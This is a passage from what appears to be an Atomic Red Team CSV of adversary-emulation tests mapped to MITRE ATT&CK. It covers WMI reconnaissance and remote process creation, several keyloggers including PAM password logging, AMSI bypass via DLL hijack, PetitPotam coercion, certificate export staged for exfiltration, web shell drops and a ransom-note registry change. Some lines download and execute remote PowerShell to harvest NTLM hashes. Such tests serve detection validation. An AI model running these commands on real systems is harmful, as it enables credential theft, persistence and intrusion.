[ ""$(uname)"" = 'FreeBSD' ] && /bin/echo ""#\!/bin/sh"" > ""testdirwithspaceend /init "" && echo 'echo ""print(\""running T1035.006 with space after filename to masquerade init\"")"" | python3.9' >> ""testdirwithspaceend /init "" && echo ""exit"" >> ""testdirwithspaceend /init "" || /usr/bin/echo -e ""%d\na\n#!/usr/bin/perl\nprint \""running T1035.006 with space after filename to masquerade init\\n\"";\nqx/cp \/usr\/bin\/perl 'init  '/;\nqx/'.\/init  ' -e 'sleep 5'/;\n.\nwq\n"" | ed 'testdirwithspaceend /init ' >/dev/null
chmod +x 'testdirwithspaceend /init '
'./testdirwithspaceend /init '
",sh,,,rm -rf /tmp/atomic-test-T1036.006,,,
T1047,Windows Management Instrumentation,WMI Reconnaissance Users,c107778c-dcf5-47c5-af2e-1d058a3df3ea,"An adversary might use WMI to list all local User Accounts. 
When the test completes , there should be local user accounts information displayed on the command line.
",windows,,,"wmic useraccount get /ALL /format:csv
",command_prompt,,,,,,
T1047,Windows Management Instrumentation,WMI Reconnaissance Processes,5750aa16-0e59-4410-8b9a-8a47ca2788e2,"An adversary might use WMI to list Processes running on the compromised host.
When the test completes , there should be running processes listed on the command line.
",windows,,,"wmic process get caption,executablepath,commandline /format:csv
",command_prompt,,,,,,
T1047,Windows Management Instrumentation,WMI Reconnaissance Software,718aebaa-d0e0-471a-8241-c5afa69c7414,"An adversary might use WMI to list installed Software hotfix and patches.
When the test completes, there should be a list of installed patches and when they were installed.
",windows,,,"wmic qfe get description,installedOn /format:csv
",command_prompt,,,,,,
T1047,Windows Management Instrumentation,WMI Reconnaissance List Remote Services,0fd48ef7-d890-4e93-a533-f7dedd5191d3,"An adversary might use WMI to check if a certain Remote Service is running on a remote device. 
When the test completes, a service information will be displayed on the screen if it exists.
A common feedback message is that ""No instance(s) Available"" if the service queried is not running.
A common error message is ""Node - (provided IP or default)  ERROR Description =The RPC server is unavailable"" 
if the provided remote host is unreachable
",windows,,,"wmic /node:""#{node}"" service where (caption like ""%#{service_search_string}%"")
",command_prompt,,,,,,"input_arguments.node.description: Ip Address

input_arguments.node.type: string

input_arguments.node.default: 127.0.0.1

input_arguments.service_search_string.description: Name Of Service

input_arguments.service_search_string.type: string

input_arguments.service_search_string.default: Spooler

"
T1047,Windows Management Instrumentation,WMI Execute Local Process,b3bdfc91-b33e-4c6d-a5c8-d64bee0276b3,"This test uses wmic.exe to execute a process on the local host.
When the test completes , a new process will be started locally .A notepad application will be started when input is left on default.
",windows,,,"wmic process call create #{process_to_execute}
",command_prompt,,,"wmic process where name='#{process_to_execute}' delete >nul 2>&1
",,,"input_arguments.process_to_execute.description: Name or path of process to execute.

input_arguments.process_to_execute.type: string

input_arguments.process_to_execute.default: notepad.exe

"
T1047,Windows Management Instrumentation,WMI Execute Remote Process,9c8ef159-c666-472f-9874-90c8d60d136b,"This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.
To clean up, provide the same node input as the one provided to run the test
A common error message is ""Node - (provided IP or default)  ERROR Description =The RPC server is unavailable"" if the default or provided IP is unreachable
",windows,,,"wmic /user:#{user_name} /password:#{password} /node:""#{node}"" process call create #{process_to_execute}
",command_prompt,,,"wmic /user:#{user_name} /password:#{password} /node:""#{node}"" process where name='#{process_to_execute}' delete >nul 2>&1
",,,"input_arguments.node.description: Ip Address

input_arguments.node.type: string

input_arguments.node.default: 127.0.0.1

input_arguments.user_name.description: Username

input_arguments.user_name.type: string

input_arguments.user_name.default: DOMAIN\Administrator

input_arguments.password.description: Password

input_arguments.password.type: string

input_arguments.password.default: P@ssw0rd1

input_arguments.process_to_execute.description: Name or path of process to execute.

input_arguments.process_to_execute.type: string

input_arguments.process_to_execute.default: notepad.exe

"
T1047,Windows Management Instrumentation,Create a Process using WMI Query and an Encoded Command,7db7a7f9-9531-4840-9b30-46220135441c,"Solarigate persistence is achieved via backdoors deployed via various techniques including using PowerShell with an EncodedCommand
 Powershell -nop -exec bypass -EncodedCommand <encoded command>
Where the –EncodedCommand, once decoded, would resemble:
  Invoke-WMIMethod win32_process -name create -argumentlist ‘rundll32 c:\windows\idmu\common\ypprop.dll _XInitImageFuncPtrs’ -ComputerName WORKSTATION
The EncodedCommand in this atomic is the following: Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe
You should expect to see notepad.exe running after execution of this test.
[Solarigate Analysis from Microsoft](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)
",windows,,,"powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA
",command_prompt,,,,,,
T1047,Windows Management Instrumentation,Create a Process using obfuscated Win32_Process,10447c83-fc38-462a-a936-5102363b1c43,"This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.
[Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)
",windows,,,"$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(""Win32_Process""))
$NewClass = $Class.Derive(""#{new_class}"")
$NewClass.Put()
Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}
",powershell,True,,"$CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath(""#{new_class}""))
try { $CleanupClass.Delete() } catch {}
",,,"input_arguments.new_class.description: Derived class name

input_arguments.new_class.type: string

input_arguments.new_class.default: Win32_Atomic

input_arguments.process_to_execute.description: Name or path of process to execute.

input_arguments.process_to_execute.type: string

input_arguments.process_to_execute.default: notepad.exe

"
T1047,Windows Management Instrumentation,WMI Execute rundll32,00738d2a-4651-4d76-adf2-c43a41dfb243,"This test uses wmic.exe to execute a DLL function using rundll32. Specify a valid value for remote IP using the node parameter.
",windows,,,"wmic /node:#{node} process call create ""rundll32.exe \""#{dll_to_execute}\"" #{function_to_execute}""
",command_prompt,,,taskkill /f /im calculator.exe,powershell,"dependencies.0.description: DLL with function to execute must exist on disk at specified location (#{dll_to_execute})
dependencies.0.prereq_command: if (Test-Path ""#{dll_to_execute}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/bin/calc.dll?raw=true"" -OutFile ""#{dll_to_execute}""

","input_arguments.node.description: Ip Address

input_arguments.node.type: string

input_arguments.node.default: 127.0.0.1

input_arguments.dll_to_execute.description: Path to DLL.

input_arguments.dll_to_execute.type: string

input_arguments.dll_to_execute.default: PathToAtomicsFolder\..\ExternalPayloads\calc.dll

input_arguments.function_to_execute.description: Name of DLL function to call

input_arguments.function_to_execute.type: string

input_arguments.function_to_execute.default: StartW

"
T1047,Windows Management Instrumentation,Application uninstall using WMIC,c510d25b-1667-467d-8331-a56d3e9bc4ff,Emulates uninstalling  applications using WMIC.  This method only works if the product was installed with an msi file.  APTs have been seen using this to uninstall security products.,windows,,,"wmic /node:""#{node}"" product where ""name like '#{product}%%'"" call uninstall",command_prompt,True,,"msiexec /i ""PathToAtomicsFolder\..\ExternalPayloads\tightvncinstaller.msi"" /qn /norestart",powershell,"dependencies.0.description: TightVNC must be installed.
dependencies.0.prereq_command: if ((Test-Path ""C:\Program Files\TightVNC\tvnviewer.exe"")-Or (Test-Path ""C:\Program Files (x86)\TightVNC\tvnviewer.exe"")) {exit 0} else {exit 1}
dependencies.0.get_prereq_command: Invoke-WebRequest 'https://www.tightvnc.com/download/2.8.63/tightvnc-2.8.63-gpl-setup-64bit.msi' -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\tightvncinstaller.msi""
start-sleep -s 10
msiexec /i ""PathToAtomicsFolder\..\ExternalPayloads\tightvncinstaller.msi"" /qn /norestart
start-sleep -s 15
","input_arguments.node.description: Computer the action is being executed against but defaults to the localhost.

input_arguments.node.type: string

input_arguments.node.default: 127.0.0.1

input_arguments.product.description: Enter the product name being uninstalled.  This will default to TightVNC.

input_arguments.product.type: string

input_arguments.product.default: Tightvnc

"
T1612,Build Image on Host,Build Image On Host,2db30061-589d-409b-b125-7b473944f9b3,"Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize Deploy Container using that custom image.",containers,,,"docker build -t t1612  $PathtoAtomicsFolder/T1612/src/
docker run --name t1612_container  -d -t t1612
docker exec t1612_container ./test.sh",sh,,,"docker stop t1612_container
docker rmi -f t1612",sh,"dependencies.0.description: Verify docker is installed.
dependencies.0.prereq_command: which docker

dependencies.0.get_prereq_command: if [ """" == ""`which docker`"" ]; then echo ""Docker Not Found""; if [ -n ""`which apt-get`"" ]; then sudo apt-get -y install docker ; elif [ -n ""`which yum`"" ]; then sudo yum -y install docker ; fi ; else echo ""Docker installed""; fi

dependencies.1.description: Verify docker service is running.
dependencies.1.prereq_command: sudo systemctl status docker  --no-pager

dependencies.1.get_prereq_command: sudo systemctl start docker

",
T1056.001,Input Capture: Keylogging,Input Capture,d9b633ca-8efb-45e6-b838-70f595c6ae26,"Utilize PowerShell and external resource to capture keystrokes
[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)
Provided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)

Upon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.
",windows,,,"&""$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1"" -LogPath #{filepath}
",powershell,True,,"Remove-Item $env:TEMP\key.log -ErrorAction Ignore
",,"dependencies.0.description: Get-Keystrokes PowerShell script must exist on disk at PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -ItemType Directory (Split-Path ""PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1"") -Force | Out-Null
Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile ""PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1""

","input_arguments.filepath.description: Name of the local file, include path.

input_arguments.filepath.type: path

input_arguments.filepath.default: $env:TEMP\key.log

"
T1056.001,Input Capture: Keylogging,Living off the land Terminal Input Capture on Linux with pam.d,9c6bdb34-a89f-4b90-acb1-5970614c711b,"Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.

Passwords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).

Use 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. 
",linux,,,"if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;
if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;
sudo touch /tmp/password-auth.bk
sudo touch /tmp/system-auth.bk sudo echo ""session    required    pam_tty_audit.so
enable=* log_password"" >> /etc/pam.d/password-auth sudo echo ""session    required    pam_tty_audit.so
enable=* log_password"" >> /etc/pam.d/system-auth
",sh,True,,"sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth
sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
",,"dependencies.0.description: Checking if pam_tty_audit.so is installed

dependencies.0.prereq_command: test -f '/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so'

dependencies.0.get_prereq_command: echo ""Sorry, you must install module pam_tty_audit.so and recompile, for this test to work""

",
T1056.001,Input Capture: Keylogging,Logging bash history to syslog,0e59d59d-3265-4d35-bebd-bf5c1ec40db5,"There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable ""if set"" will be executed before the PS1 variable and can be configured to write the latest ""bash history"" entries to the syslog.

To gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ 
",linux,,,"PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t ""$USER[$$] $SSH_CONNECTION "")'
echo ""\$PROMPT_COMMAND=$PROMPT_COMMAND""
tail /var/log/syslog
",sh,True,,"unset PROMPT_COMMAND
",sh,"dependencies.0.description: This test requires to be run in a bash shell and that logger and tee are installed.

dependencies.0.prereq_command: if [ ""$(echo $SHELL)"" != ""/bin/bash"" ]; then echo -e ""\n***** Bash not running! *****\n""; exit 1; fi
if [ ! -x ""$(command -v logger)"" ]; then echo -e ""\n***** logger NOT installed *****\n""; exit 1; fi
if [ ! -x ""$(command -v tee)"" ]; then echo -e ""\n***** tee NOT installed *****\n""; exit 1; fi

dependencies.0.get_prereq_command: echo """"

",
T1056.001,Input Capture: Keylogging,Logging sh history to syslog/messages,b04284dc-3bd9-4840-8d21-61b8d31c99f2,"There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable ""if set"" will be executed before the PS1 variable and can be configured to write the latest ""bash history"" entries to the syslog.

To gain persistence the command could be added to the users .shrc or .profile 
",linux,,,"PS2=`logger -t ""$USER"" -f ~/.sh_history`
$PS2
tail /var/log/messages
",sh,True,,"unset PS2
",sh,"dependencies.0.description: This test requires to be run in a bash shell and that logger and tee are installed.

dependencies.0.prereq_command: if [ ""$(echo $SHELL)"" != ""/bin/sh"" ]; then echo -e ""\n***** sh not running! *****\n""; exit 1; fi
if [ ! -x ""$(command -v logger)"" ]; then echo -e ""\n***** logger NOT installed *****\n""; exit 1; fi

dependencies.0.get_prereq_command: echo """"

",
T1056.001,Input Capture: Keylogging,Bash session based keylogger,7f85a946-a0ea-48aa-b6ac-8ff539278258,"When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = ""echo $BASH_COMMAND"". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. 

To gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ 
",linux,,,"trap 'echo ""$(date +""%d/%m/%y %H:%M:%S.%s"") $USER $BASH_COMMAND"" >> #{output_file}' DEBUG
echo ""Hello World!""
cat #{output_file}
",bash,False,,"rm #{output_file}
",sh,"dependencies.0.description: This test requires to be run in a bash shell

dependencies.0.prereq_command: if [ ""$(echo $0)"" != ""bash"" ]; then echo -e ""\n***** Bash not running! *****\n""; exit 1; fi

dependencies.0.get_prereq_command: echo """"

","input_arguments.output_file.description: File to store captured commands

input_arguments.output_file.type: string

input_arguments.output_file.default: /tmp/.keyboard.log

"
T1056.001,Input Capture: Keylogging,SSHD PAM keylogger,81d7d2ad-d644-4b6a-bea7-28ffe43becca,"Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.
",linux,,,"cp -v /etc/pam.d/sshd /tmp/
echo ""session required pam_tty_audit.so disable=* enable=* open_only log_passwd"" >> /etc/pam.d/sshd
systemctl restart sshd
systemctl restart auditd
ssh #{user_account}@localhost 
whoami
sudo su
whoami
exit
exit
",sh,True,,"cp -fv /tmp/sshd /etc/pam.d/
",sh,"dependencies.0.description: This test requires sshd and auditd

dependencies.0.prereq_command: if [ ! -x ""$(command -v sshd)"" ]; then echo -e ""\n***** sshd NOT installed *****\n""; exit 1; fi
if [ ! -x ""$(command -v auditd)"" ]; then echo -e ""\n***** auditd NOT installed *****\n""; exit 1; fi

dependencies.0.get_prereq_command: echo """"

","input_arguments.user_account.description: Basic ssh user account for testing.

input_arguments.user_account.type: string

input_arguments.user_account.default: ubuntu

"
T1056.001,Input Capture: Keylogging,Auditd keylogger,a668edb9-334e-48eb-8c2e-5413a40867af,"The linux audit tool auditd can be used to capture 32 and 64 bit command execution and place the command in the /var/log/audit/audit.log audit log. 
",linux,,,"auditctl -a always,exit -F arch=b64 -S execve -k CMDS 
auditctl -a always,exit -F arch=b32 -S execve -k CMDS
whoami; ausearch -i --start $(date +""%d/%m/%y %H:%M:%S"") 
",sh,True,,"systemctl restart auditd
",sh,"dependencies.0.description: This test requires sshd and auditd

dependencies.0.prereq_command: if [ ! -x ""$(command -v auditd)"" ]; then echo -e ""\n***** auditd NOT installed *****\n""; exit 1; fi

dependencies.0.get_prereq_command: echo """"

",
T1056.001,Input Capture: Keylogging,MacOS Swift Keylogger,aee3a097-4c5c-4fff-bbd3-0a705867ae29,"Utilizes a swift script to log keys to sout. It runs for 5 seconds then dumps the output to standard. Input Monitoring is required.
Input Monitoring can be enabled in System Preferences > Security & Privacy > Privacy > Input Monitoring.
Referece: https://cedowens.medium.com/taking-esf-for-a-nother-spin-6e1e6acd1b74
",macos,,,"swift #{swift_src} -keylog
",bash,False,,"kill `pgrep swift-frontend`
",bash,"dependencies.0.description: swift script must exist at #{swift_src}, and the terminal must have input monitoring permissions.

dependencies.0.prereq_command: if [ -f #{swift_src} ]; then chmod +x #{swift_src}; else exit 1; fi

dependencies.0.get_prereq_command: echo """"

","input_arguments.swift_src.description: Location of swift script

input_arguments.swift_src.type: path

input_arguments.swift_src.default: PathToAtomicsFolder/T1056.001/src/MacOSKeylogger.swift

"
T1547.010,Boot or Logon Autostart Execution: Port Monitors,Add Port Monitor persistence in Registry,d34ef297-f178-4462-871e-9ce618d44e50,Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.,windows,,,"reg add ""hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"" /v ""Driver"" /d ""#{monitor_dll}"" /t REG_SZ /f
",command_prompt,True,,"reg delete ""hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"" /f >nul 2>&1
",,,"input_arguments.monitor_dll.description: Addition to port monitor registry key. Normally refers to a DLL name in C:\Windows\System32 but an arbitrary DLL can be specified with the absolute path.

input_arguments.monitor_dll.type: path

input_arguments.monitor_dll.default: $PathToAtomicsFolder\T1547.010\bin\PortMonitor.dll

"
T1574.001,Hijack Execution Flow: DLL Search Order Hijacking,DLL Search Order Hijacking - amsi.dll,8549ad4b-b5df-4a2d-a3d7-2aee9e7052a3,"Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)
https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/

Upon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.
",windows,,,"copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
%APPDATA%\updater.exe -Command exit
",command_prompt,True,,"del %APPDATA%\updater.exe >nul 2>&1
del %APPDATA%\amsi.dll >nul 2>&1
",,,
T1187,Forced Authentication,PetitPotam,485ce873-2e65-4706-9c7e-ae3ab9e14213,"This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.
",windows,,,"& ""#{petitpotam_path}"" #{captureServerIP} #{targetServerIP} #{efsApi}
Write-Host ""End of PetitPotam attack""
",powershell,False,,,powershell,"dependencies.0.description: PetitPotam binary must exist on disk and at specified location (#{petitpotam_path}).
And the computer must be domain joined (implicit authentication).

dependencies.0.prereq_command: if (Test-Path ""#{petitpotam_path}"") { exit 0 } else { exit 1 }

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/topotam/PetitPotam/blob/2ae559f938e67d0cd59c5afcaac67672b9ef2981/PetitPotam.exe?raw=true"" -OutFile ""#{petitpotam_path}""

","input_arguments.captureServerIP.description: Computer IP to use to receive the authentication (ex. attacker machine used for NTLM relay)

input_arguments.captureServerIP.type: string

input_arguments.captureServerIP.default: 10.0.0.3

input_arguments.targetServerIP.description: Computer IP to force authentication from (ex. domain controller)

input_arguments.targetServerIP.type: string

input_arguments.targetServerIP.default: 10.0.0.2

input_arguments.efsApi.description: EFS API to use to coerce authentication

input_arguments.efsApi.type: integer

input_arguments.efsApi.default: 1

input_arguments.petitpotam_path.description: PetitPotam Windows executable

input_arguments.petitpotam_path.type: path

input_arguments.petitpotam_path.default: PathToAtomicsFolder\..\ExternalPayloads\PetitPotam.exe

"
T1187,Forced Authentication,WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS,7f06b25c-799e-40f1-89db-999c9cc84317,PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
Invoke-Internalmonologue -command ""-Downgrade true -impersonate true -restore true""",powershell,,,,,,
T1649,Steal or Forge Authentication Certificates,Staging Local Certificates via Export-Certificate,eb121494-82d1-4148-9e2b-e624e03fbf3d,"Export all user certificates and add to a compressed archive.
",windows,,,"$archive=""$env:PUBLIC\T1649\atomic_certs.zip""
$exfilpath=""$env:PUBLIC\T1649\certs""
Add-Type -assembly ""system.io.compression.filesystem""
Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
mkdir $exfilpath | Out-Null
foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer}
[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)
",powershell,,,"$exfilpath=""$env:PUBLIC\T1649\certs""
Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
",,,
T1505.003,Server Software Component: Web Shell,Web Shell Written to Disk,0a2ce662-1efa-496f-a472-2fe7b080db16,"This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.
Idea from APTSimulator.
cmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
",windows,,,"xcopy /I /Y ""#{web_shells}"" #{web_shell_path}
",command_prompt,,,"del #{web_shell_path}\b.jsp /q >nul 2>&1
del #{web_shell_path}\tests.jsp /q >nul 2>&1
del #{web_shell_path}\cmd.aspx /q >nul 2>&1
",powershell,"dependencies.0.description: Web shell must exist on disk at specified location (#{web_shells})

dependencies.0.prereq_command: if (Test-Path ""#{web_shells}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""#{web_shells}"" -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp"" -OutFile ""#{web_shells}/b.jsp""
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp"" -OutFile ""#{web_shells}/tests.jsp""
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx"" -OutFile ""#{web_shells}/cmd.aspx""

","input_arguments.web_shell_path.description: The path to drop the web shell

input_arguments.web_shell_path.type: string

input_arguments.web_shell_path.default: C:\inetpub\wwwroot

input_arguments.web_shells.description: Path of Web Shell

input_arguments.web_shells.type: path

input_arguments.web_shells.default: PathToAtomicsFolder\T1505.003\src

"
T1592.001,Gather Victim Host Information: Hardware,Enumerate PlugNPlay Camera,d430bf85-b656-40e7-b238-42db01df0183,"Enumerate PlugNPlay Camera using powershell commandlet. this technique was seen in dcrat malware backdoor capabilities where it enumerate the camera info mounted on the compromised host. reference: https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor
",windows,,,"Get-CimInstance -Query ""SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')""
",powershell,True,,,,,
T1491.001,Defacement: Internal Defacement,Replace Desktop Wallpaper,30558d53-9d76-41c4-9267-a7bd5184bed3,"Downloads an image from a URL and sets it as the desktop wallpaper.
",windows,,,"$url = ""#{url_of_wallpaper}""
$imgLocation = ""#{wallpaper_location}""
$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\Control Panel\Desktop\' -Name WallPaper).WallPaper
$orgWallpaper | Out-File -FilePath ""#{pointer_to_orginal_wallpaper}""
$updateWallpapercode = @' 
using System.Runtime.InteropServices; 
namespace Win32{

    public class Wallpaper{ 
        [DllImport(""user32.dll"", CharSet=CharSet.Auto)] 
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
         
         public static void SetWallpaper(string thePath){ 
            SystemParametersInfo(20,0,thePath,3); 
        }
    }
} 
'@
$wc = New-Object System.Net.WebClient  
try{  
    $wc.DownloadFile($url, $imgLocation)
    add-type $updateWallpapercode 
    [Win32.Wallpaper]::SetWallpaper($imgLocation)
} 
catch [System.Net.WebException]{  
    Write-Host(""Cannot download $url"") 
    add-type $updateWallpapercode 
    [Win32.Wallpaper]::SetWallpaper($imgLocation)
} 
finally{    
    $wc.Dispose()  
}
",powershell,,,"$updateWallpapercode = @' 
using System.Runtime.InteropServices; 
namespace Win32{

    public class Wallpaper{ 
        [DllImport(""user32.dll"", CharSet=CharSet.Auto)] 
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
         
         public static void SetWallpaper(string thePath){ 
            SystemParametersInfo(20,0,thePath,3); 
        }
    }
} 
'@
if (Test-Path -Path #{pointer_to_orginal_wallpaper} -PathType Leaf) {
     $orgImg = Get-Content -Path ""#{pointer_to_orginal_wallpaper}""
     add-type $updateWallpapercode 
     [Win32.Wallpaper]::SetWallpaper($orgImg)
}
Remove-Item ""#{pointer_to_orginal_wallpaper}"" -ErrorAction Ignore
Remove-Item ""#{wallpaper_location}"" -ErrorAction Ignore
",,,"input_arguments.url_of_wallpaper.description: URL pointing to the image file you wish to set as wallpaper

input_arguments.url_of_wallpaper.type: url

input_arguments.url_of_wallpaper.default: https://redcanary.com/wp-content/uploads/Atomic-Red-Team-Logo.png

input_arguments.pointer_to_orginal_wallpaper.description: Full path to where a file containing the original wallpaper location will be saved

input_arguments.pointer_to_orginal_wallpaper.type: string

input_arguments.pointer_to_orginal_wallpaper.default: $env:TEMP\T1491.001-OrginalWallpaperLocation

input_arguments.wallpaper_location.description: Full path to where the downloaded wallpaper image will be saved

input_arguments.wallpaper_location.type: string

input_arguments.wallpaper_location.default: $env:TEMP\T1491.001-newWallpaper.png

"
T1491.001,Defacement: Internal Defacement,Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message,ffcbfaab-c9ff-470b-928c-f086b326089b,"Display ransom message to users at system start-up by configuring registry keys HKLM\SOFTWARE\Micosoft\Windows\CurrentVersion\Policies\System\LegalNoticeCaption and HKLM\SOFTWARE\Micosoft\Windows\CurrentVersion\Policies\System\LegalNoticeText.

[SynAck Ransomware](https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/synack-ransomware-leverages-process-doppelg-nging-for-evasion-and-infection), 
[Grief Ransomware](https://redcanary.com/blog/grief-ransomware/), 
[Maze Ransomware](https://cyware.com/research-and-analysis/maze-ransomware-a-deadly-combination-of-data-theft-and-encryption-to-target-us-organizations-8f27),
[Pysa Ransomware](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-destructive-pysa-ransomware),
[Spook Ransomware](https://community.fortinet.com/t5/FortiEDR/Threat-Coverage-How-FortiEDR-protects-against-Spook-Ransomware/ta-p/204226),
[DopplePaymer Ransomware](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Dopplepaymer&threatId=-2147221958),
[Reedemer Ransomware](https://blog.cyble.com/2022/07/20/redeemer-ransomware-back-action/),
[Kangaroo Ransomware](https://www.bleepingcomputer.com/news/security/the-kangaroo-ransomware-not-only-encrypts-your-data-but-tries-to-lock-you-out-of-windows/)
",windows,,,"$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption).LegalNoticeCaption
$orgLegalNoticeText = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText).LegalNoticeText
$newLegalNoticeCaption = ""#{legal_notice_caption}""
$newLegalNoticeText = ""#{legal_notice_text}""
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force
